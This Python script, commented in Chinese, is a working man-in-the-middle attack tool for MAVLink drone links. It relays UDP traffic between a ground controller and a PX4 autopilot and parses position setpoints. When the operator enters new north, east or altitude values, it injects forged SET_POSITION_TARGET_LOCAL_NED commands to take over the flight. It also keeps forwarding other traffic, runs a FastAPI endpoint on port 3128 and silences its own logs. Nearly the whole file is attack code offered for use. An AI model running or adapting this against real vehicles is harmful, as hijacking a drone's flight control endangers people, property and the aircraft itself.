import socket
import time
import threading
from select import select
from pymavlink import mavutil
from queue import Queue, Empty
from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn
import logging
import binascii
import queue


# ==================== FastAPI 服务 ====================
app = FastAPI()

# 控制信号数据模型
class ControlSignal(BaseModel):
    x: float
    y: float
    z: float

# 当前的控制信号（x, y, z）
current_control_signal = ControlSignal(x=0.0, y=0.0, z=0.0)

# 获取当前的控制信号
@app.get("/get_control_signal/")
async def get_control_signal():
    return {"x": current_control_signal.x, "y": current_control_signal.y, "z": current_control_signal.z}

# 设置新的控制信号
@app.post("/set_control_signal/")
async def set_control_signal(control_signal: ControlSignal):
    global current_control_signal
    current_control_signal = control_signal
    return {"message": "Control signal updated", "data": control_signal.dict()}


# ==================== 原有代码 ====================
LISTEN_HOST = "0.0.0.0"  # 监听所有网络接口
PORT_A = 14556  # 控制器 -> MITM 监听端口
PORT_B = 14557  # PX4 -> MITM 监听端口

# 动态获取用户输入的控制器和 PX4 的 IP 地址
CONTROLLER_IP = input("请输入控制器的 IP 地址: ")  # 控制器 IP 地址
CONTROLLER_TELEM_PORT = 14557  # 控制器通信端口

PX4_IP = input("请输入 PX4 的 IP 地址: ")  # PX4 IP 地址
PX4_PORT = 14556  # PX4 通信端口

DEFAULT_INJECT_HZ = 10.0  # 默认注入频率（每秒注入次数）
ALT_TTL = 0.2  # 数据包生存时间（TTL）

ml_ctrl = mavutil.mavlink.MAVLink(None)  # 创建 MAVLink 对象用于控制器
ml_px4 = mavutil.mavlink.MAVLink(None)  # 创建 MAVLink 对象用于 PX4

# 创建 UDP 套接字，用于接收来自控制器和 PX4 的数据
s_a = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s_b = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 绑定套接字到指定的地址和端口，并设置为非阻塞模式
s_a.bind((LISTEN_HOST, PORT_A))
s_a.setblocking(False)  # 绑定端口 14556 用于控制器数据
s_b.bind((LISTEN_HOST, PORT_B))
s_b.setblocking(False)  # 绑定端口 14557 用于 PX4 数据

# 将两个套接字添加到列表中，方便之后进行 I/O 操作
sockets = [s_a, s_b]

# state
last_sig = None
last_setpoint_time = 0.0
intervals = []
learned_hz = None

# takeover
takeover_lock = threading.Lock()
taking_over = False
inject_thread = None
inject_hz = DEFAULT_INJECT_HZ
inject_alt = None
inject_template = None

stop_event = threading.Event()

# 当前线程变量

# input queue
input_q = queue.Queue()
last_alt_print = 0.0


def parse_datagram(data, parser):
    msgs = []
    for b in data:
        try:
            p = parser.parse_char(bytes([b]))
        except TypeError:
            try:
                p = parser.parse_char(b)
            except Exception:
                p = None
        except Exception:
            p = None
        if p is not None:
            msgs.append(p)
    return msgs


def msg_sig(m):
    try:
        t = m.get_type()
    except Exception:
        return None
    if t in ("SET_POSITION_TARGET_LOCAL_NED", "POSITION_TARGET_LOCAL_NED"):
        x = getattr(m, "x", None)
        y = getattr(m, "y", None)
        z = getattr(m, "z", None)
        yaw = getattr(m, "yaw", None)
        alt = None if z is None else -float(z)
        def r(v): return None if v is None else round(float(v), 3)
        return (t, r(x), r(y), r(alt), r(yaw))
    return (t,)


# 更新终端显示的控制信号位置
def update_terminal_position(x, y, z):
    print(f"\r[MITM] Position: x={x:7.2f} y={y:7.2f} z={z:7.2f} m", end="", flush=True)


def telemetry_handle(m):
    """
    打印 PX4 位置: x, y, z (m)
    使用 LOCAL_POSITION_NED：
      x = 北向 (N)
      y = 东向 (E)
      z = 高度（上为正） = -m.z
    """
    global last_alt_print
    now = time.time()

    if m.get_type() == "LOCAL_POSITION_NED":
        try:
            x = float(m.x)
            y = float(m.y)
            z = -float(m.z)  # NED 中 down 为正，这里取反当作“高度”
        except Exception:
            return

        # 只有当高度（或者其他位置数据）变化时才更新终端
        if (now - last_alt_print) >= ALT_TTL:
            last_alt_print = now
            print(f"\r[MITM] Position: x={x:7.2f} y={y:7.2f} z={z:7.2f} m", end="", flush=True)


# 更新控制信号
def update_control_signal(x, y, z):
    global current_control_signal
    control_signal = ControlSignal(x=x, y=y, z=z)
    # 通过 FastAPI 更新当前控制信号
    current_control_signal = control_signal
    # 只有当位置发生变化时才输出到终端
    print(f"[MITM] Updated control signal: x={x}, y={y}, z={z}")
    update_terminal_position(x, y, z)


def injector_loop(x, y, yaw, alt_m, hz):
    # 更新控制信号
    update_control_signal(x, y, alt_m)

    tx = mavutil.mavlink_connection(f"udpout:{PX4_IP}:{PX4_PORT}", autoreconnect=True)
    period = 1.0 / max(0.1, hz)

    try:
        while True:
            if stop_event.is_set():
                print("[INJ] Stop signal received, exiting injector loop...")
                break  # 退出循环，线程将结束

            with takeover_lock:
                if not taking_over:
                    break

            try:
                t_ms = int((time.time() % 3600) * 1000)
                mask = (
                    mavutil.mavlink.POSITION_TARGET_TYPEMASK_VX_IGNORE |
                    mavutil.mavlink.POSITION_TARGET_TYPEMASK_VY_IGNORE |
                    mavutil.mavlink.POSITION_TARGET_TYPEMASK_VZ_IGNORE |
                    mavutil.mavlink.POSITION_TARGET_TYPEMASK_AX_IGNORE |
                    mavutil.mavlink.POSITION_TARGET_TYPEMASK_AY_IGNORE |
                    mavutil.mavlink.POSITION_TARGET_TYPEMASK_AZ_IGNORE |
                    mavutil.mavlink.POSITION_TARGET_TYPEMASK_YAW_RATE_IGNORE
                )
                tx.mav.set_position_target_local_ned_send(
                    t_ms,
                    1, 1,
                    mavutil.mavlink.MAV_FRAME_LOCAL_NED,
                    mask,
                    float(x if x is not None else 0.0),
                    float(y if y is not None else 0.0),
                    float(-alt_m),
                    0, 0, 0, 0, 0, 0,
                    float(yaw if yaw is not None else 0.0),
                    0.0
                )
            except Exception as e:
                print("[INJ] send err", e)

            time.sleep(period)
    finally:
        pass


def stdin_reader():
    while True:
        cmd = input().strip()
        input_q.put(cmd)  # 将用户输入放入队列


def get_user_input(prompt):
    # 打印提示并等待输入
    print(prompt)
    return input_q.get()  # 从队列中获取输入


# 启动 FastAPI 服务
def start_fastapi():
    # 禁用 uvicorn 的日志输出
    logger = logging.getLogger("uvicorn")
    logger.setLevel(logging.CRITICAL)  # 禁用所有日志（最低级别为 CRITICAL）

    # 启动 FastAPI 服务器
    uvicorn.run(app, host="0.0.0.0", port=3128, log_level="critical", access_log=False)  # 禁用访问日志


def deep_parse_datagram(datagram):
    print("\n=== DEEP PARSE (RAW HEX) ===")
    print(binascii.hexlify(datagram).decode())  # 打印数据包的十六进制表示
    msgs = parse_datagram(datagram, ml_ctrl)
    if not msgs:
        print("no high-level pymavlink messages parsed from datagram")
        return
    for m in msgs:
        try:
            t = m.get_type()
        except Exception:
            t = "<unknown>"
        print(f"\n[MESSAGE] type={t} id={getattr(m, 'msgid', None)}")
        try:
            names = list(m.get_fieldnames())
        except Exception:
            names = []
        if names:
            print("FIELDS:")
            for n in names:
                try:
                    v = getattr(m, n)
                except Exception:
                    v = "<err>"
                print(f"  {n}: {v}")
        else:
            for k, v in getattr(m, "__dict__", {}).items():
                print(f"  {k}: {v}")
        try:
            buf = m.get_msgbuf()
            print("RAW_MSGBUF_HEX:")
            print(binascii.hexlify(buf).decode())
        except Exception as e:
            print("cannot get raw msgbuf:", e)


def main():
    global last_sig, last_setpoint_time, intervals, learned_hz
    global taking_over, inject_thread, inject_hz, inject_alt, inject_template
    global CONTROLLER_IP, PX4_IP

    # 启动 FastAPI 服务
    threading.Thread(target=start_fastapi, daemon=True).start()

    print(f"[MITM] using Controller_IP={CONTROLLER_IP}, PX4_IP={PX4_IP}")
    print(f"[MITM] listen {LISTEN_HOST}:{PORT_A} & {LISTEN_HOST}:{PORT_B}")
    print("On new controller setpoint you'll be prompted.")
    print("You can change N(x), E(y), and ALT.")
    print("Blank = keep original; 'stop' to stop takeover, 'quit' to exit.")

    threading.Thread(target=stdin_reader, daemon=True).start()

    try:
        while True:
            try:
                while True:
                    cmd = input_q.get_nowait()
                    if cmd.lower() == "stop":
                        with takeover_lock:
                            taking_over = False
                        print("\n[MITM] takeover stopped, forwarding resumed.")
                    elif cmd.lower() == "quit":
                        print("\n[MITM] quitting.")
                        return
                    else:
                        input_q.queue.appendleft(cmd)
                        break
            except Empty:
                pass

            r, _, _ = select(sockets, [], [], 0.1)
            for s in r:
                try:
                    data, addr = s.recvfrom(65535)
                except Exception:
                    continue
                src = addr[0]

                # ========== Controller -> MITM ========== (控制器数据处理)
                if src == CONTROLLER_IP:
                    msgs = parse_datagram(data, ml_ctrl)
                    found = None
                    for m in msgs[::-1]:
                        if m.get_type() in ("SET_POSITION_TARGET_LOCAL_NED", "POSITION_TARGET_LOCAL_NED"):
                            found = m
                            break
                    if found:
                        sig = msg_sig(found)
                        now = time.time()
                        if last_setpoint_time > 0:
                            intervals.append(now - last_setpoint_time)
                            if len(intervals) > 40:
                                intervals.pop(0)
                            if len(intervals) >= 3:
                                avg = sum(intervals) / len(intervals)
                                if avg > 0:
                                    learned_hz = 1.0 / avg
                        last_setpoint_time = now

                        if sig != last_sig:
                            last_sig = sig
                            deep_parse_datagram(data)
							
                            x = getattr(found, "x", None)
                            y = getattr(found, "y", None)
                            z = getattr(found, "z", None)
                            yaw = getattr(found, "yaw", None)
                            alt = None if z is None else -float(z)
                            print(f"\n[CTRL] {found.get_type()} n={x} e={y} alt={alt} m yaw={yaw} ")

                            # ========= 可篡改 x / y / alt =========
                            new_x_str = get_user_input("Enter new N (m) or blank to keep:").strip()  # 获取 N 坐标
                            new_x = float(new_x_str) if new_x_str else x  # 如果没有输入值，保持原值
                            
                            new_y_str = get_user_input("Enter new E (m) or blank to keep:").strip()  # 获取 E 坐标
                            new_y = float(new_y_str) if new_y_str else y  # 如果没有输入值，保持原值
                            
                            new_alt_str = get_user_input("Enter new ALT (m) or blank to keep:").strip()  # 获取 ALT
                            new_alt = float(new_alt_str) if new_alt_str else alt  # 如果没有输入值，保持原值
							
                            changed = False
                            if new_x != x or new_y != y or new_alt != alt:
                                changed = True

                            if changed:
                                print(f"[MITM] Position changed: N={new_x} E={new_y} ALT={new_alt:.2f}")
                                inject_template = (new_x, new_y, yaw)
                                inject_alt = new_alt if new_alt is not None else alt
                                inject_hz = learned_hz if learned_hz is not None else DEFAULT_INJECT_HZ
								
                                with takeover_lock:
                                    taking_over = True
                                
                                if inject_thread and inject_thread.is_alive():
                                    print("Stopping the previous thread...")
                                    stop_event.set()  # 设置停止标志
                                    inject_thread.join()  # 等待线程结束
                                    stop_event.clear()  # 清除停止标志，准备启动新的线程

                                # 启动新线程
                                print("Starting a new thread...")
                                inject_thread = threading.Thread(
                                    target=injector_loop,
                                    args=(new_x, new_y, yaw, inject_alt, inject_hz),
                                    daemon=True
                                )
                                inject_thread.start()
                                print(f"[MITM] takeover started: n={new_x} e={new_y} alt={inject_alt:.2f}m @ {inject_hz:.1f}Hz")
                            else:
                                print("[MITM] No change, forwarding original data.")
                                try:
                                    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (PX4_IP, PX4_PORT))
                                except Exception:
                                    pass
                        else:
                            with takeover_lock:
                                if not taking_over:
                                    try:
                                        socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (PX4_IP, PX4_PORT))
                                    except Exception:
                                        pass
                    else:
                        try:
                            socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (PX4_IP, PX4_PORT))
                        except Exception:
                            pass

                # ========== PX4 -> MITM ========== (PX4 数据处理)
                elif src == PX4_IP:
                    try:
                        socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (CONTROLLER_IP, CONTROLLER_TELEM_PORT))
                    except Exception:
                        pass
                    msgs = parse_datagram(data, ml_px4)
                    for m in msgs:
                        telemetry_handle(m)

                # ========== other ========== (其他数据处理)
                else:
                    try:
                        socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (PX4_IP, PX4_PORT))
                        socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (CONTROLLER_IP, CONTROLLER_TELEM_PORT))
                    except Exception:
                        pass

    except KeyboardInterrupt:
        print("\n[MITM] exiting")


if __name__ == "__main__":
    main()
